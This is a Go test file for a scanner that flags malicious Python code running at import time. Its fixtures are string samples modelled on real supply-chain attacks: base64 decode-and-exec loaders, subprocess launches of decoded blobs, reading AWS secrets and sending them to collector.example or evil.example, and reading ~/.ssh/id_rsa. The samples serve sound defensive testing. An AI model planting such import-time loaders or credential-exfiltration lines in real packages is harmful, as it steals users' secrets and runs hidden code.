package installsurface

import (
	"fmt"
	"testing"
)

func loadTimeHasCap(h Hook, c Capability) bool {
	for _, x := range h.Caps {
		if x == c {
			return true
		}
	}
	return false
}

// one scans a single module and returns its surface.
func loadTimeOne(t *testing.T, rel, src string) Surface {
	t.Helper()
	return AnalyzePythonLoadTime(map[string]string{rel: src})
}

// TestLoadTimeMalicious pins the true positives — import-time payloads the
// analyzer MUST surface, with the capability combination that drives the VC-002
// family.
func TestLoadTimeMalicious(t *testing.T) {
	cases := []struct {
		name     string
		src      string
		wantCaps []Capability
	}{
		{
			// The telnyx _client.py shape: functions defined then CALLED at
			// module level, with the payload in the bodies. Reachability must
			// follow the calls, or this is missed entirely.
			name: "telnyx-called-functions",
			src: `import os
import subprocess
import base64

def setup():
    if os.name != 'nt':
        return
    blob = base64.b64decode(PAYLOAD)
    subprocess.Popen(blob)

def fetch_audio():
    if os.name == 'nt':
        return
    subprocess.Popen([sys.executable, "-c", "exec(base64.b64decode('eA=='))"], start_new_session=True)

setup()
fetch_audio()
`,
			wantCaps: []Capability{CapObfuscation, CapExec},
		},
		{
			// The litellm shape, at module level directly.
			name: "litellm-module-level-decode-exec",
			src: `import base64
exec(base64.b64decode('aW1wb3J0IHNvY2tldA=='))
`,
			wantCaps: []Capability{CapObfuscation, CapExec},
		},
		{
			// Credential read + network egress at import.
			name: "credential-exfil",
			src: `import os
import urllib.request
_t = os.environ['AWS_SECRET_ACCESS_KEY']
urllib.request.urlopen('http://collector.example/c?t=' + _t)
`,
			wantCaps: []Capability{CapCredentials, CapNetwork},
		},
		{
			// A NAMED secret read at import, on its own: no benign SDK reads
			// ~/.ssh/id_rsa when you import it.
			name: "named-credential-read",
			src: `import os
_k = open(os.path.expanduser('~/.ssh/id_rsa')).read()
`,
			wantCaps: []Capability{CapCredentials},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			s := loadTimeOne(t, "pkg/mod.py", tc.src)
			if len(s.Hooks) != 1 {
				t.Fatalf("expected 1 import-time hook, got %d", len(s.Hooks))
			}
			h := s.Hooks[0]
			if h.Name != "import-time:pkg/mod.py" {
				t.Errorf("hook name = %q, want import-time:pkg/mod.py", h.Name)
			}
			for _, c := range tc.wantCaps {
				if !loadTimeHasCap(h, c) {
					t.Errorf("missing capability %q; got %v", c, h.Caps)
				}
			}
		})
	}
}

// TestLoadTimeBenign pins the false-positive controls — legitimate import-time
// patterns that MUST NOT produce a hook. This set is the make-or-break of the
// analyzer (D-165 §6).
func TestLoadTimeBenign(t *testing.T) {
	cases := []struct {
		name string
		src  string
	}{
		{
			name: "env-read-only",
			src: `import os
DEBUG = os.environ.get('MYAPP_DEBUG', '0')
LEVEL = os.environ.get('MYAPP_LEVEL', 'info')
`,
		},
		{
			// Embedded data decoded but never executed — no exec sink, so not a
			// loader.
			name: "embedded-data-decode-no-exec",
			src: `import base64
_FONT = base64.b64decode('AAAAAAAA')
`,
		},
		{
			// Capability probe: exec at import, but nothing else.
			name: "subprocess-capability-probe",
			src: `import subprocess
_HAS_GIT = subprocess.call(['git', '--version']) == 0
`,
		},
		{
			// Plugin registry: dynamic imports, no escalation.
			name: "plugin-registry",
			src: `import importlib
for _n in ('alpha', 'beta', 'gamma'):
    importlib.import_module('myapp.plugins.' + _n)
`,
		},
		{
			// The payload exists but is in a function NEVER called at import —
			// reachability must exclude it.
			name: "uncalled-malicious-helper",
			src: `import os
import urllib.request

def _exfil():
    t = os.environ['AWS_SECRET_ACCESS_KEY']
    urllib.request.urlopen('http://evil.example/' + t)

VERSION = '1.0'
`,
		},
		{
			// Same payload, but guarded by __main__ — runs as a script, not on
			// import.
			name: "main-guarded-payload",
			src: `import os
import urllib.request

if __name__ == '__main__':
    t = os.environ['AWS_SECRET_ACCESS_KEY']
    urllib.request.urlopen('http://evil.example/' + t)
`,
		},
		{
			name: "empty-module",
			src:  "\n# just a comment\n",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			s := loadTimeOne(t, "pkg/mod.py", tc.src)
			if len(s.Hooks) != 0 {
				t.Errorf("benign import-time code must not produce a hook; got %d: %+v", len(s.Hooks), s.Hooks)
			}
		})
	}
}

// TestLoadTimeReachabilityPair is the tightest reachability assertion: the same
// credential-exfil body is DETECTED when the function is called at module level
// and IGNORED when it is not. Detection must track import-time reachability, not
// mere presence of dangerous code somewhere in the file.
func TestLoadTimeReachabilityPair(t *testing.T) {
	body := `import os
import urllib.request

def _run():
    t = os.environ['AWS_SECRET_ACCESS_KEY']
    urllib.request.urlopen('http://evil.example/' + t)
`
	if s := loadTimeOne(t, "m.py", body); len(s.Hooks) != 0 {
		t.Errorf("uncalled function body must not fire; got %+v", s.Hooks)
	}
	if s := loadTimeOne(t, "m.py", body+"\n_run()\n"); len(s.Hooks) != 1 {
		t.Errorf("the same body, called at module level, must fire exactly one hook; got %d", len(s.Hooks))
	}
}

// TestLoadTimeBoundDisclosed pins that the module cap degrades coverage, not
// truth: past maxLoadTimeRefs modules, the scan stops and says so.
func TestLoadTimeBoundDisclosed(t *testing.T) {
	mods := map[string]string{}
	for i := 0; i < maxImportTimeModules+4; i++ {
		mods[fmt.Sprintf("pkg/m%02d.py", i)] = "import base64\nexec(base64.b64decode('eA=='))\n"
	}
	s := AnalyzePythonLoadTime(mods)
	if len(s.Hooks) != maxImportTimeModules {
		t.Errorf("scanned hook count = %d, want the cap %d", len(s.Hooks), maxImportTimeModules)
	}
	if len(s.Truncated) == 0 {
		t.Error("a capped scan must disclose the bound via Surface.Truncated")
	}
}
